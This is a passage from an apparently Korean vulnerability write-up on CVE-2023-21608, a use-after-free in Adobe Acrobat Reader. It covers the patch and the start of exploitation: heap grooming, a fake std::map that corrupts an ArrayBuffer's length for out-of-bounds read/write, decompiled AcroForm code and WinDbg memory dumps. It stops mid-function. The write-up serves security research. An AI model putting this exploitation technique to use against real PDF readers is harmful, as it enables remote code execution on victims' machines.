&lt;p&gt;&amp;#xB530;&amp;#xB77C;&amp;#xC11C; &lt;code&gt;GetRichValueEventProp&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;IsDataInGlobalHashTable&lt;/code&gt;&amp;#xC740; &lt;code&gt;true&lt;/code&gt;&amp;#xB97C; &amp;#xBC18;&amp;#xD658;&amp;#xD558;&amp;#xAC8C; &amp;#xB418;&amp;#xACE0; &lt;code&gt;CAggToESVal&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xC544; &amp;#xBC84;&amp;#xADF8;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB610;&amp;#xD55C; &lt;code&gt;richValue&lt;/code&gt;&amp;#xC640; &amp;#xB3D9;&amp;#xC77C;&amp;#xD55C; &amp;#xBC29;&amp;#xC2DD;&amp;#xC73C;&amp;#xB85C; &amp;#xBC84;&amp;#xADF8;&amp;#xB97C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xD0AC; &amp;#xC218; &amp;#xC788;&amp;#xB294; &lt;code&gt;richChange&lt;/code&gt;&amp;#xC640; &amp;#xAD00;&amp;#xB828;&amp;#xB41C; &lt;code&gt;SetRichChangeEventProp&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC640; &lt;code&gt;GetRichChangeEventProp&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB3C4; &amp;#xAC19;&amp;#xC740; &amp;#xBC29;&amp;#xC2DD;&amp;#xC73C;&amp;#xB85C; &amp;#xD328;&amp;#xCE58;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;4-Exploitation&#34;&gt;&lt;a href=&#34;#4-Exploitation&#34; class=&#34;headerlink&#34; title=&#34;4. Exploitation&#34;&gt;&lt;/a&gt;4. Exploitation&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xC774;&amp;#xC81C; &amp;#xB300;&amp;#xB9DD;&amp;#xC758; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xB9CC;&amp;#xC774; &amp;#xB0A8;&amp;#xC558;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC704;&amp;#xC5D0;&amp;#xC11C; &amp;#xC598;&amp;#xAE30;&amp;#xD55C; &amp;#xAC83;&amp;#xCC98;&amp;#xB7FC; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC5D0;&amp;#xC11C;&amp;#xB3C4; &amp;#xC790;&amp;#xBC14;&amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8;&amp;#xAC00; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xACE0; &amp;#xC774;&amp;#xC804;&amp;#xAE4C;&amp;#xC9C0; &amp;#xC790;&amp;#xBC14;&amp;#xC2A4;&amp;#xD06C;&amp;#xB9BD;&amp;#xD2B8; &amp;#xC5D4;&amp;#xC9C4; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xACBD;&amp;#xD5D8;&amp;#xC774; &amp;#xC5C6;&amp;#xC5C8;&amp;#xAE30;&amp;#xC5D0; &amp;#xAD49;&amp;#xC7A5;&amp;#xD788; &amp;#xC2E0;&amp;#xC120;&amp;#xD558;&amp;#xAC8C; &amp;#xB290;&amp;#xAEF4;&amp;#xC9C0;&amp;#xAE30;&amp;#xB3C4; &amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%205.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;del&gt;&amp;#xADF8;&amp;#xB798;&amp;#xB3C4; &amp;#xB09C; &amp;#xD30C;&amp;#xC774;&amp;#xC36C;&amp;#xC774; &amp;#xC88B;&amp;#xC544;&lt;/del&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;RCE &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC744; &amp;#xC704;&amp;#xD574; &amp;#xBA3C;&amp;#xC800; &amp;#xD799; &amp;#xADF8;&amp;#xB8E8;&amp;#xBC0D;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; Use-After-Free&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xACF5;&amp;#xACA9;&amp;#xC790;&amp;#xAC00; &amp;#xC870;&amp;#xC791;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xD558;&amp;#xACE0; &amp;#xC774;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xBC84;&amp;#xADF8;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD560; &amp;#xB54C; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; &amp;#xD2B9;&amp;#xC815; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xC758; length&amp;#xAC00; &amp;#xB36E;&amp;#xC5B4; &amp;#xC4F0;&amp;#xC774;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5B4; &amp;#xC774;&amp;#xB97C; OOB Read/Write&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;1-Create-Corrupted-ArrayBuffer&#34;&gt;&lt;a href=&#34;#1-Create-Corrupted-ArrayBuffer&#34; class=&#34;headerlink&#34; title=&#34;1. Create Corrupted ArrayBuffer&#34;&gt;&lt;/a&gt;1. Create Corrupted ArrayBuffer&lt;/h2&gt;&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; page-heap&amp;#xC774; &amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xB41C; &amp;#xC0C1;&amp;#xD0DC;&amp;#xC5D0;&amp;#xC11C; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &lt;code&gt;CAgg::operator[]&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;CAgg-operator&#34;&gt;&lt;a href=&#34;#CAgg-operator&#34; class=&#34;headerlink&#34; title=&#34;CAgg::operator[]&#34;&gt;&lt;/a&gt;CAgg::operator[]&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __userpurge CAgg::&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;[]@&amp;lt;eax&amp;gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;@&amp;lt;ecx&amp;gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; *a2@&amp;lt;ebx&amp;gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *someID)
{
...
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt; == &lt;span class=&#34;hljs-number&#34;&gt;0x13&lt;/span&gt; )                          &lt;span class=&#34;hljs-comment&#34;&gt;// this-&amp;gt;type&lt;/span&gt;
  {
    v6 = *(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; (__fastcall **)(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;))(dword_21473CA4 + &lt;span class=&#34;hljs-number&#34;&gt;28&lt;/span&gt;);
    v7 = __guard_check_icall_fptr(someID);
    v8 = (&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *)v6(v7);
    v15 = (&lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; *)sub_20867317(v8, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
    v9 = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *)&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;];
    v16 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
    v11 = *(_DWORD *)sub_20AA6EED((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)a2a, v10, v9, (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;v15, (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)a2a);
    v16 = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v15 )
      sub_208679A2(v15);
    result = v11 + &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt; == &lt;span class=&#34;hljs-number&#34;&gt;0x14&lt;/span&gt; )
    {
      v4 = (_DWORD *)&lt;span class=&#34;hljs-built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;,CAgg&amp;gt;::&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;[](&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;], (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v14, v12);
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
      CAgg::Convert((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, (_DWORD *)&lt;span class=&#34;hljs-number&#34;&gt;0x14&lt;/span&gt;);
      v4 = (_DWORD *)&lt;span class=&#34;hljs-built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;,CAgg&amp;gt;::&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;[](&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;], (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)a2a, &amp;amp;someID);&lt;span class=&#34;hljs-comment&#34;&gt;// this-&amp;gt;map&lt;/span&gt;
    }
    result = *v4 + &lt;span class=&#34;hljs-number&#34;&gt;24&lt;/span&gt;;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xD799; &amp;#xADF8;&amp;#xB8E8;&amp;#xBC0D;&amp;#xC774; &amp;#xC131;&amp;#xACF5;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C4; &amp;#xC0C1;&amp;#xD0DC;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;EScript_ESObjectEnum_CallbackProc&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC544;&amp;#xB798;&amp;#xCC98;&amp;#xB7FC; &amp;#xACF5;&amp;#xACA9;&amp;#xC790;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &amp;#xCEE8;&amp;#xD2B8;&amp;#xB864;&amp;#xB418;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; &lt;code&gt;CAgg::operator[]&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;eax&lt;/span&gt;=&lt;span class=&#34;hljs-number&#34;&gt;00001&lt;/span&gt;b&lt;span class=&#34;hljs-number&#34;&gt;36&lt;/span&gt; ebx=&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; ecx=&lt;span class=&#34;hljs-number&#34;&gt;2909&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;478&lt;/span&gt; edx=&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;60&lt;/span&gt;da&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; esi=&lt;span class=&#34;hljs-number&#34;&gt;71&lt;/span&gt;eaef&lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt; edi=&lt;span class=&#34;hljs-number&#34;&gt;2909&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;478&lt;/span&gt;
&lt;span class=&#34;hljs-attribute&#34;&gt;eip&lt;/span&gt;=&lt;span class=&#34;hljs-number&#34;&gt;63&lt;/span&gt;ac&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;a&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;b esp=&lt;span class=&#34;hljs-number&#34;&gt;0457&lt;/span&gt;ac&lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt; ebp=&lt;span class=&#34;hljs-number&#34;&gt;0457&lt;/span&gt;ac&lt;span class=&#34;hljs-number&#34;&gt;28&lt;/span&gt; iopl=&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;         nv up ei pl zr na pe nc
&lt;span class=&#34;hljs-attribute&#34;&gt;cs&lt;/span&gt;=&lt;span class=&#34;hljs-number&#34;&gt;0023&lt;/span&gt;  ss=&lt;span class=&#34;hljs-number&#34;&gt;002&lt;/span&gt;b  ds=&lt;span class=&#34;hljs-number&#34;&gt;002&lt;/span&gt;b  es=&lt;span class=&#34;hljs-number&#34;&gt;002&lt;/span&gt;b  fs=&lt;span class=&#34;hljs-number&#34;&gt;0053&lt;/span&gt;  gs=&lt;span class=&#34;hljs-number&#34;&gt;002&lt;/span&gt;b             efl=&lt;span class=&#34;hljs-number&#34;&gt;00200246&lt;/span&gt;
&lt;span class=&#34;hljs-attribute&#34;&gt;AcroForm&lt;/span&gt;!DllUnregisterServer+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;hljs-number&#34;&gt;69&lt;/span&gt;eb:
&lt;span class=&#34;hljs-attribute&#34;&gt;63ac2a4b&lt;/span&gt; e&lt;span class=&#34;hljs-number&#34;&gt;83&lt;/span&gt;b&lt;span class=&#34;hljs-number&#34;&gt;410000&lt;/span&gt;      call    AcroForm!DllUnregisterServer+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xab&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;b (&lt;span class=&#34;hljs-number&#34;&gt;63&lt;/span&gt;ac&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;b&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;b)
&lt;span class=&#34;hljs-attribute&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;000&lt;/span&gt;&amp;gt; dd ecx // ecx+&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; == this-&amp;gt;map
&lt;span class=&#34;hljs-attribute&#34;&gt;2909d478&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;d &lt;span class=&#34;hljs-number&#34;&gt;50504&lt;/span&gt;f&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;f *&lt;span class=&#34;hljs-number&#34;&gt;20000058&lt;/span&gt;* &lt;span class=&#34;hljs-number&#34;&gt;54545353&lt;/span&gt;
&lt;span class=&#34;hljs-attribute&#34;&gt;2909d488&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;56565555&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;58585757&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;a&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;a&lt;span class=&#34;hljs-number&#34;&gt;5959&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;b&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;b
&lt;span class=&#34;hljs-attribute&#34;&gt;2909d498&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;d &lt;span class=&#34;hljs-number&#34;&gt;60605&lt;/span&gt;f&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;f &lt;span class=&#34;hljs-number&#34;&gt;00006161&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
&lt;span class=&#34;hljs-attribute&#34;&gt;2909d4a8&lt;/span&gt;  b&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;fe&lt;span class=&#34;hljs-number&#34;&gt;1536&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;002000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;42424141&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;44444343&lt;/span&gt;
&lt;span class=&#34;hljs-attribute&#34;&gt;2909d4b8&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;46464545&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;48484747&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;a&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;a&lt;span class=&#34;hljs-number&#34;&gt;4949&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;b&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;b
&lt;span class=&#34;hljs-attribute&#34;&gt;2909d4c8&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;d &lt;span class=&#34;hljs-number&#34;&gt;50504&lt;/span&gt;f&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;f &lt;span class=&#34;hljs-number&#34;&gt;20000058&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;54545353&lt;/span&gt;
&lt;span class=&#34;hljs-attribute&#34;&gt;2909d4d8&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;56565555&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;58585757&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;a&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;a&lt;span class=&#34;hljs-number&#34;&gt;5959&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;b&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;b
&lt;span class=&#34;hljs-attribute&#34;&gt;2909d4e8&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;d &lt;span class=&#34;hljs-number&#34;&gt;60605&lt;/span&gt;f&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;f &lt;span class=&#34;hljs-number&#34;&gt;00006161&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt; &lt;code&gt;std::map&amp;lt;unsigned short,CAgg&amp;gt;::operator[]&lt;/code&gt;&amp;#xD638;&amp;#xCD9C;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; &lt;code&gt;this-&amp;gt;map&lt;/code&gt;&amp;#xC740; &amp;#xD799; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; 0x20000048&amp;#xC5D0; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xACE0; &amp;#xC788;&amp;#xACE0;  0x20000048&amp;#xC5D0; 0x10 &amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xC758; &amp;#xD5E4;&amp;#xB354;&amp;#xAC00; &amp;#xC704;&amp;#xCE58;&amp;#xD574;&amp;#xC788;&amp;#xC73C;&amp;#xBA70; 0x20000058&amp;#xBD80;&amp;#xD130; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC704;&amp;#xCE58;&amp;#xD558;&amp;#xACE0; &amp;#xC774;&amp;#xB294; &amp;#xACF5;&amp;#xACA9;&amp;#xC790;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &amp;#xC0AC;&amp;#xC804;&amp;#xC5D0; &amp;#xAD6C;&amp;#xC131;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs basic&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;000&lt;/span&gt;&amp;gt; dd &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x20000048
&lt;span class=&#34;hljs-symbol&#34;&gt;20000048 &lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0000&lt;/span&gt;ffe8 &lt;span class=&#34;hljs-number&#34;&gt;17&lt;/span&gt;c7bbe0 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;20000058 &lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;20000060&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;41424345&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;41424344&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;20000044&lt;/span&gt; // &lt;span class=&#34;hljs-number&#34;&gt;20000058&lt;/span&gt; : this-&amp;gt;map
&lt;span class=&#34;hljs-symbol&#34;&gt;20000068 &lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;33333333&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;33333333&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;33333333&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;33333333&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;20000078 &lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;33333333&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;33333333&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC704; &amp;#xB370;&amp;#xC774;&amp;#xD130; &amp;#xC911; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xC758; &amp;#xAE38;&amp;#xC774;&amp;#xB97C; &amp;#xB098;&amp;#xD0C0;&amp;#xB0B4;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC740; &amp;#xC624;&amp;#xD504;&amp;#xC14B; + 0x4&amp;#xC778; 0x2000004c&amp;#xB85C; &lt;code&gt;std::map&amp;lt;unsigned short,CAgg&amp;gt;::operator[]&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; 0x20000058&amp;#xC5D0; &amp;#xAD6C;&amp;#xC131;&amp;#xB41C; fake &lt;code&gt;map&lt;/code&gt;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &lt;code&gt;lower_bound&lt;/code&gt;&amp;#xC640; &lt;code&gt;insert&lt;/code&gt;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; &amp;#xBCC0;&amp;#xC870;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;std-map-operator&#34;&gt;&lt;a href=&#34;#std-map-operator&#34; class=&#34;headerlink&#34; title=&#34;std::map::operator[]&#34;&gt;&lt;/a&gt;std::map&lt;unsigned short,cagg&gt;::operator[]&lt;/unsigned&gt;&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __thiscall &lt;span class=&#34;hljs-built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;,CAgg&amp;gt;::&lt;span class=&#34;hljs-keyword&#34;&gt;operator&lt;/span&gt;[](TREE_VAL *&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a2, &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int16 *pSomeID)
{
	...
	&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v8[&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;]
  ...
  &lt;span class=&#34;hljs-built_in&#34;&gt;std&lt;/span&gt;::&lt;span class=&#34;hljs-built_in&#34;&gt;map&lt;/span&gt;&amp;lt;&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;short&lt;/span&gt;,CAgg&amp;gt;::lower_bound(&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, v8, pSomeID);
  v4 = v9;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( sub_208E95F2(v9, pSomeID) )
  {
    ...
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;-&amp;gt;_Mysize == &lt;span class=&#34;hljs-number&#34;&gt;0x38E38E3&lt;/span&gt; )
